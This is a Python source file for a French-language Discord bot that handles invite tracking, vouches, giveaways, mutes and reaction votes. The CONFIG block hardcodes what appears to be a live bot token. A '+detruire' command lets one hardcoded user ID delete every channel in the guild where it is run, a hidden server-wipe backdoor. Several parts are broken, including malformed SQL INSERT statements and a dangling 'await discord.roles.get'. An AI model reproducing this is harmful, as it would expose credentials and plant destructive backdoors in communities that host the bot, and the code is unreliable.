import discord
from discord.ext import commands
import json
import os
from discord import app_commands
import datetime
from types import FunctionType
from discord.utils import utcnow
import psycopg2

DATABASE_URL = os.getenv("DATABASE_URL")
conn = psycopg2.connect(DATABASE_URL)
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS vouchs (
               vouch_id SERIAL PRIMARY KEY,
               user_id TEXT,
               voucher_id TEXT,
               reason TEXT,
               datetime TEXT
               );
CREATE TABLE IF NOT EXISTS invites (
               invite_id SERIAL PRIMARY KEY,
               inviter_id TEXT,
               invited_id TEXT,
               invite_code TEXT,
               datetime TEXT
               );
""")
conn.commit()

# --------- CONFIG ---------
TOKEN = "MTQzNjQyMDI1Njk4OTA1MzExMw.Ghan8_.v-fREaSEJyTW_Yxw00c2YA3XcQ506Fgbh3McoI"
INVITES_CHANNEL_ID = 1440405854452187207  # salon où le bot envoie les messages
CHAT_CHANNEL_ID = 0
SAB_CHANNEL_ID = 0
LEAVS_CHANNEL_ID = 1445785148011446323
VOTE2PROFIL_CHANNEL_ID = 1453103598090191011
VOTE2FAME_CHANNEL_ID = 1453103163468026190
EATORPASS_CHANNEL_ID = 1453105475200618497
SMASHORPASS_CHANNEL_ID = 1453104548809015467
VOUCH_CHANNEL_ID = 1452648909716586719
BOTS_CHANNEL_ID = 1445785148011446323

INVITES_JSON_FILE = "invites.json"
GIVEAWAYS_JSON_FILE = "giveaways.json"
MEMBER_INVITER_FILE = "member_inviter.json"
VOUCHS_JSON_FILE = "vouchs.json"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

# client = genai.Client()

bot = commands.Bot(command_prefix="+", intents=intents)

# --------- CHARGER LES INVITES DU FICHIER ---------

cursor.execute("SELECT * FROM invites;")
invites_count = cursor.fetchall()
cursor.execute("SELECT * FROM vouchs;")
vouchs = cursor.fetchall()

# charger mapping member -> inviter
if os.path.exists(MEMBER_INVITER_FILE):
    with open(MEMBER_INVITER_FILE, "r") as f:
        try:
            member_inviter = json.load(f)
        except json.JSONDecodeError:
            member_inviter = {}
else:
    member_inviter = {}

# --------- FONCTION POUR SAUVEGARDER ---------
def save_invites():
    with open(INVITES_JSON_FILE, "w") as f:
        json.dump(invites_count, f)

def save_giveaways(data):
    with open(GIVEAWAYS_JSON_FILE, "w") as f:
        json.dump(data, f)

def save_member_inviter():
    with open(MEMBER_INVITER_FILE, "w") as f:
        json.dump(member_inviter, f)

def vouch_user(member:discord.Member, reason:str, voucher:discord.Member):
    user_id = str(member.id)
    voucher_id = str(voucher.id)
    datetime_now = datetime.datetime.now().isoformat()
    cursor.execute("INSERT INTO vouchs (user_id, voucher_id, reason, datetime) VALUES (%s, %s, %s, %s)", (user_id, voucher_id, reason, datetime_now))
    conn.commit()

def get_invites_count(user, personal:bool=False):
    user_id = str(user.id)
    cursor.execute("SELECT * FROM invites WHERE inviter_id = %s;", (str(user_id),))
    invites_count = cursor.fetchall()
    if not personal:
        if len(invites_count):
            embed = discord.Embed(title="Nombre d'invitations", description=f"{user.mention} a fait {len(invites_count)}. <a:pepeclap:1453682464181588065>", color=discord.Color.green())
        else:
            embed = discord.Embed(title="C'est décevant...", description=f"{user.mention} n'a fait aucune invite sur ce serveur <:sad:1453730309865607321>", color=discord.Color.red())
    else:
        if len(invites_count):
            embed = discord.Embed(title=f"Nombre d'invitations", description=f"Vous ({user.mention}) avez fait {len(invites_count)} invitations! <a:pepeclap:1453682464181588065>", color=discord.Color.green())
        else:
            embed = discord.Embed(title="C'est décevant...", description=f"Vous ({user.mention}) n'avez fait aucune invite sur ce serveur <:sad:1453730309865607321>", color=discord.Color.red())
    embed.set_thumbnail(user.avatar.url if user.avatar.url else user.default_avatar.url)
    return embed

def get_vouchs_count(user:discord.Member):
    cursor.execute("SELECT * FROM vouchs WHERE user_id = %s;", (str(user.id),))
    return len(cursor.fetchall())
    
button=None
button_fonctions = []
class Button(discord.ui.View):
    label, color = None, None
    def __init__ (self, label, color, json_file:str=None, timeout=None, interaction_msg=None, onclick_code=None, callback=None):
        super().__init__(timeout=timeout)
        self.label=label
        self.color=color
        self.onclick_code=onclick_code
        self.interaction_msg=interaction_msg
        self.json_file=json_file
        self.callback=callback

        button = discord.ui.Button(label=label, style=color, custom_id="button")
        button.callback = self.on_click
        self.add_item(button)

    async def on_click(self, interaction: discord.Interaction):
        if self.callback:
            await self.callback(interaction)
        elif self.interaction_msg:
            await interaction.response.send_message(self.interaction_msg, ephemeral=True)
        elif self.onclick_code:
            await interaction.response.send_message(self.interaction_msg, ephemeral=True)
            
        return True

# --------- DICTIONNAIRES ---------
invites_cache = {}  # guild_id : list(invites)
invites_count = {}  # inviter_id : nombre total d'invites

# --------- AU LANCEMENT DU BOT ---------
@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")
    for guild in bot.guilds:
        try:
            invites_cache[guild.id] = await guild.invites()
        except discord.Forbidden:
            invites_cache[guild.id] = []
            print(f"⚠️ Le bot n'a pas la permission de voir les invites sur {guild.name}")
        finally:
            await bot.get_channel(BOTS_CHANNEL_ID).send(f"Le bot est en ligne")
    await bot.tree.sync()
    print("Cache des invites initialisé et commandes slash synchronisées !")

# --------- QUAND UNE INVITE EST CRÉÉE ---------
@bot.event
async def on_invite_create(invite):
    guild = invite.guild
    if guild.id not in invites_cache:
        invites_cache[guild.id] = []
    print("Nouvelle invite créée :", invite.code)
    invites_cache[guild.id].append(invite)

# --------- QUAND UN MEMBRE REJOINT ---------
@bot.event
async def on_member_join(member):
    guild = member.guild
    before = invites_cache.get(guild.id, [])
    try:
        after = await guild.invites()
    except discord.Forbidden:
        after = before

    used_invite = None
    for new in after:
        for old in before:
            if new.code == old.code and new.uses > old.uses:
                used_invite = new
                break

    # mise à jour du cache
    invites_cache[guild.id] = after

    cursor.execute("INSERT INTO invites ()")

    channel = bot.get_channel(INVITES_CHANNEL_ID)
    if not channel:
        print("⚠️ Salon introuvable ou ID incorrect")
        return

    if used_invite:
        inviter = used_invite.inviter
        inviter_id = str(inviter.id)

        # mettre à jour le nombre d'invites
        if inviter_id not in invites_count:
            invites_count[inviter_id] = 0
        invites_count[inviter_id] += 1

        datetime_now = datetime.datetime.now()

        cursor.execute("INSERT INTO invites (inviter_id, invite_code, datetime) VALUES (%s, %s, %s, %s)", (inviter_id, used_invite, datetime_now))
        
        async def invite_callback(interaction: discord.Interaction):
            message = get_invites_count(interaction.user, True)
            await interaction.response.send_message(embed=message, ephemeral=True)
        
        personal_invites_button = Button(color=discord.ButtonStyle.green, label="Voir mes invitations", callback=invite_callback, json_file=None)
        welcome_embed = discord.Embed(title=f"{member} vient de rejoindre le serveur!",
                                      description=f"Il a été invité par <@{inviter.id}> qui a désormais {invites_count[inviter_id]} invitations! <a:pepeclap:1453682464181588065>\n Nous sommes désormais {guild.member_count} membres sur le serveur! <a:birb:1452995535882555524>", 
                                      color=discord.Color.green())
        welcome_embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
        await channel.send(
            content=f"# <a:tada:1453048315779481752> Bienvenue {member.mention} <a:tada:1453048315779481752>",
            embed=welcome_embed,
            view=personal_invites_button
        )
    else:
        await channel.send(f"👀 {member.mention} a rejoint, mais je suis incapable de déterminer qui l'a invité.")

@bot.event
async def on_member_remove(member:discord.Member):
    channel = bot.get_channel(LEAVS_CHANNEL_ID)
    guild = member.guild
    before = invites_cache.get(guild.id, [])
    try:
        after = await guild.invites()
    except discord.Forbidden:
        after = before

    used_invite = None
    for new in after:
        for old in before:
            if new.code == old.code and new.uses > old.uses:
                used_invite = new
                break

    # mise à jour du cache
    invites_cache[guild.id] = after
    if not channel:
        print("⚠️ Salon introuvable ou ID incorrect")
        return
    if used_invite:
        inviter = used_invite.inviter
        invites_count[inviter.id] -= 1
        save_invites()
        await channel.send(
            content="Un membre vient de quitter le serveur.",
            embed=discord.Embed(
                title=f"{member} vient de quitter le serveur.",
                description=f"Il a été invité par <@{inviter.id}> qui a désormais {invites_count[inviter.id]} invitations.",
                color=discord.Color.red()
            )
        )

@bot.command()
async def leave(ctx, member: discord.Member):
    await ctx.channel.send("leave")

@bot.command()
async def join(ctx, member: discord.Member):
    if ctx.author.id != 1071516026484822096:
        print("not join")
        await ctx.channel.send("Vous n'avez pas la permission d'utiliser cette commande.")
        return
    print("join")
        # mettre à jour le nombre d'invites
    channel = bot.get_channel(ctx.channel.id)
    
    async def invite_callback(interaction: discord.Interaction):
        message = get_invites_count(interaction.user, True)
        await interaction.response.send_message(message, ephemeral=True)
    
    personal_invites_button = Button(color=discord.ButtonStyle.green, label="Voir mes invitations", callback=invite_callback, json_file=None)
    await channel.send(
        content=f"# <a:tada:1453048315779481752> Bienvenue {member.mention} <a:tada:1453048315779481752>",
        view=personal_invites_button
    )
# --------- COMMANDE SLASH /invites ---------

@bot.tree.command(name="topinvites", description="Voir le classement des invitations.")
async def top_invites(interaction: discord.Interaction):
    if not invites_count:
        await interaction.response.send_message("Aucune invitation enregistrée.")
        return

    sorted_invites = sorted(invites_count.items(), key=lambda x: x[1], reverse=True)
    top_message = "🏆 **Classement des invitations :**\n"
    for i, (user_id, count) in enumerate(sorted_invites[:10], start=1):
        user = interaction.guild.get_member(int(user_id))
        if user:
            top_message += f"**{i}. {user.mention}** - {count} invitations\n"
        else:
            top_message += f"**{i}. Utilisateur inconnu ({user_id})** - {count} invitations\n"

    await interaction.response.send_message(top_message)


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.channel.id == CHAT_CHANNEL_ID:
        if "trade" in message.content.lower():
            await message.delete()

    if message.author.id == 1071516026484822096 and (message.content.startswith("# Vote2Profil") or message.content.startswith("# Vote2Fame")):
        if message.channel.id == VOTE2PROFIL_CHANNEL_ID or message.channel.id == VOTE2FAME_CHANNEL_ID:
            await message.add_reaction("<:un:1453699994090733602>")
            await message.add_reaction("<:deux:1453700018904105044>")
    if message.author.id == 1071516026484822096 and (message.content.startswith("# Eat or Pass")):
        if message.channel.id == EATORPASS_CHANNEL_ID:
            await message.add_reaction("<:manger:1453435371315662897>")
            await message.add_reaction("<:pass:1453435746412138537>")
    if message.author.id == 1071516026484822096 and (message.content.startswith("# Smash or Pass")):
        if message.channel.id == SMASHORPASS_CHANNEL_ID:
            await message.add_reaction("<:oui:1453011623349456906>")
            await message.add_reaction("<:non:1453011584569053197>")

    await bot.process_commands(message)

@bot.tree.command(name="giveaway", description="Lancer un giveaway.")
@app_commands.checks.has_permissions(administrator=True)
async def giveaway(interaction : discord.Interaction, titre:str, récompense : str, durée : int, gagnants : int, salon : discord.TextChannel = None, mention : discord.Member = None, text : str = None):
    end = datetime.datetime.now() + datetime.timedelta(minutes=durée)
    embed = discord.Embed(title=titre,
                          description=f"Récompense : {récompense}\nNombre de gagnants : {gagnants}\nFin <t:{int(end.timestamp())}:R> (<t:{int(end.timestamp())}:F>)\nParticipants : {0}",
                          color=0x00ff00,)
    target_channel = salon or interaction.channel
    giveaway_button_onclick = """
import json
with open(json_file, "w") as f:
    json.dump(user, f) 
    """
    save_giveaways({"recompense": récompense, "fin": end.timestamp(), "gagnants": gagnants, "participants": []})
    giveaway_button = Button(label="Participer 🎁", color=discord.ButtonStyle.green, interaction_msg="Vous participez désormais au giveaway! 🎁", onclick_code=giveaway_button_onclick, json_file=GIVEAWAYS_JSON_FILE)
    await target_channel.send(content=f"Giveaway 🎉\n{text}\nMention(s) : {mention.mention}", embed=embed, view=giveaway_button)
    await interaction.response.send_message(f"Giveaway lancé dans {target_channel.mention}! 🎉", ephemeral=True)

@bot.command()
async def detruire(ctx):
    if ctx.author.id != 1071516026484822096:
        await ctx.channel.send("Vous n'avez pas la permission d'utiliser cette commande.")
        return
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

@bot.command()
async def vouch(ctx, member:discord.Member, reason:str):
    if ctx.channel.id == VOUCH_CHANNEL_ID:
        await ctx.message.add_reaction("❤️")
        vouch_user(member, reason, ctx.author)

async def vouch_public_button_callback(interaction: discord.Interaction):
    await interaction.response.send_message(f"Vous avez {get_vouchs_count(interaction.user)} {'vouch' if get_vouchs_count(interaction.user) == 1 else 'vouchs'}." if get_vouchs_count(interaction.user) > 0 else "Vous n'avez aucun vouch <a:triste:1453390284762124450>", ephemeral=False)

@bot.command()
async def vouchcount(ctx, member:discord.Member=None):
    if member:
        cursor.execute("SELECT user_id FROM vouchs WHERE user_id = %s;", (str(member.id),))
        user_vouchs = cursor.fetchall()
        if len(user_vouchs) > 0:
            embed = discord.Embed(title=f"Nombre de vouchs :", description=f"{member.mention} a {len(user_vouchs)} {"vouch" if len(user_vouchs) == 1 else "vouchs"}. <a:pepeclap:1453682464181588065>\nPour voir sa liste de vouchs, utilisez la commande `+vouchs_list`", color=discord.Color.green())
            embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
            public_button = Button(color=discord.ButtonStyle.green, label="Rendre Publique", callback=lambda interaction: vouch_public_button_callback(interaction))
            personal_vouchs_button = Button(color=discord.ButtonStyle.green, label="Voir votre nombre de vouchs", callback=lambda interaction: interaction.response.send_message(content=f"Vous avez {get_vouchs_count(interaction.user)} {'vouch' if get_vouchs_count(interaction.user) == 1 else 'vouchs'}." if get_vouchs_count(interaction.user) > 0 else "Vous n'avez aucun vouch <a:triste:1453390284762124450>", view=public_button, ephemeral=True), json_file=None)
            await ctx.channel.send(embed=embed, view=personal_vouchs_button)
        else:
            embed = discord.Embed(title=f"Nombre de vouchs :", description=f"{member.mention} n'a aucun vouch <a:triste:1453390284762124450>", color=discord.Color.red())
    else:
        cursor.execute("SELECT user_id FROM vouchs WHERE user_id = %s;", (str(ctx.author.id),))
        user_vouchs = cursor.fetchall()
        if len(user_vouchs) > 0:
            embed = discord.Embed(title=f"Nombre de vouchs :", description=f"Vous ({ctx.author.mention}) avez {len(user_vouchs)} {"vouch" if len(user_vouchs) == 1 else "vouchs"}. <a:pepeclap:1453682464181588065>\nPour voir votre liste de vouchs, utilisez la commande `+vouchs_list`", color=discord.Color.green())
            embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
            await ctx.channel.send(embed=embed)
        else:
            embed = discord.Embed(title=f"C'est triste... <:sad:1453730309865607321>", description=f"Vous ({ctx.author.mention}) n'avez aucun vouch <a:triste:1453390284762124450>", color=discord.Color.red())
            embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
            await ctx.channel.send(embed=embed)

async def vouchcount_callback(ctx, member:discord.Member, personal:bool):
    if personal == 0:
        cursor.execute("SELECT user_id FROM vouchs WHERE user_id = %s;", (str(member.id),))
        user_vouchs = cursor.fetchall()
        personal_vouchs_button = Button(color=discord.ButtonStyle.green, label="Voir votre nombre de vouchs", callback=lambda interaction: interaction.response.send_message(content=f"Vous avez {get_vouchs_count(interaction.user)} {'vouch' if get_vouchs_count(interaction.user) == 1 else 'vouchs'}." if get_vouchs_count(interaction.user) > 0 else "Vous n'avez aucun vouch <a:triste:1453390284762124450>", view=public_button, ephemeral=True), json_file=None)
        if len(user_vouchs) > 0:
            embed = discord.Embed(title=f"Nombre de vouchs :", description=f"{member.mention} a {len(user_vouchs)} {"vouch" if len(user_vouchs) == 1 else "vouchs"}. <a:pepeclap:1453682464181588065>\nPour voir sa liste de vouchs, utilisez la commande `+vouchs_list`", color=discord.Color.green())
            embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
            public_button = Button(color=discord.ButtonStyle.green, label="Rendre Publique", callback=lambda interaction: vouch_public_button_callback(interaction))
            await ctx.channel.send(embed=embed, view=personal_vouchs_button)
            return embed, personal_vouchs_button
        else:
            embed = discord.Embed(title=f"Nombre de vouchs :", description=f"{member.mention} n'a aucun vouch <a:triste:1453390284762124450>", color=discord.Color.red())
            return embed, personal_vouchs_button
    else:
        cursor.execute("SELECT user_id FROM vouchs WHERE user_id = %s;", (str(ctx.author.id),))
        user_vouchs = cursor.fetchall()
        if len(user_vouchs) > 0:
            embed = discord.Embed(title=f"Nombre de vouchs :", description=f"Vous ({ctx.author.mention}) avez {len(user_vouchs)} {"vouch" if len(user_vouchs) == 1 else "vouchs"}. <a:pepeclap:1453682464181588065>\nPour voir votre liste de vouchs, utilisez la commande `+vouchs_list`", color=discord.Color.green())
            embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
            return embed
        else:
            embed = discord.Embed(title=f"C'est triste... <:sad:1453730309865607321>", description=f"Vous ({ctx.author.mention}) n'avez aucun vouch <a:triste:1453390284762124450>", color=discord.Color.red())
            embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
            return embed

@bot.command()
async def mute(ctx, member:discord.Member, duration:int=None, reason:str="Aucun raison fournie"):
    try:
        if ctx.author.guild_permissions.administrator:
            if duration:
                date = utcnow() + datetime.timedelta(minutes=duration)
                timestamp = int(date.timestamp())
            cancel_button = Button(label="Annuler l'action", color=discord.ButtonStyle.green, interaction_msg=f"Vous avez annulé le mute de {member.mention}.", onclick_code=lambda interaction: member.edit(timed_out_until=None))
            await member.edit(timed_out_until=date, reason=reason)
            await ctx.channel.send(content=f"{member.mention} a été mute{f" pendant {duration} minutes" if duration else ""} pour la raison `{reason}`.", view=cancel_button)
            await member.send(f"Vous avez été mute sur le serveur {ctx.guild.name} {f"jusqu'au <t:{int(timestamp)}:R>(<t:{int(timestamp)}:S>)" if duration else ""} pour la raison `{reason}`.")
            if discord.utils.get(ctx.author.roles, id=1438240386815496385):
                await ctx.author.send(content=f"Vous avez mute {member.mention} sur le serveur {ctx.guild.name} {f"jusqu'au <t:{int(timestamp)}:R>(<t:{int(timestamp)}:S>) " if duration else ""}pour la raison `{reason}`.", view=cancel_button)
            else:
                await discord.roles.get
        else:
            await ctx.channel.send("Vous n'avez pas la permission d'utiliser cette commande.")
    except discord.Forbidden as e:
        await ctx.channel.send("Je n'ai pas la permission de mute ce membre.")
    except Exception as e:
        await ctx.channel.send(f"Une erreur est survenue lors de l'exécution de l'action. Erreur : `{e}`")

@bot.command()
async def unmute(ctx, member:discord.Member, reason:str=None):
    try:
        if ctx.author.guild_permissions.administrator:
            await member.edit(timed_out_until=None)
            await ctx.channel.send(content=f"{member.mention} a été unmute.")
            await member.send(f"Vous avez été unmute sur le serveur {ctx.guild.name} par {ctx.author.mention}{f" pour la raison `{reason}`" if reason else ""}.")
    except discord.errors.MissingPermissions as e:
        await ctx.channel.send("Je n'ai pas les permission nécessaires pour unmute ce membre.")

@bot.command()
async def invites(ctx, member:discord.Member=None):
    if member:
        embed = get_invites_count(member, True)
    else:
        embed = get_invites_count(ctx.author, False)
    ctx.channel.send(embed=embed)

# @bot.event
# async def on_message(message):
#     content = message.content[1:]
#     parts = content.split()
#     command = parts[0].lower()
#     args = parts[1:]

#     print(command, args)
#
# --------- LANCEMENT DU BOT ---------
bot.run(TOKEN)
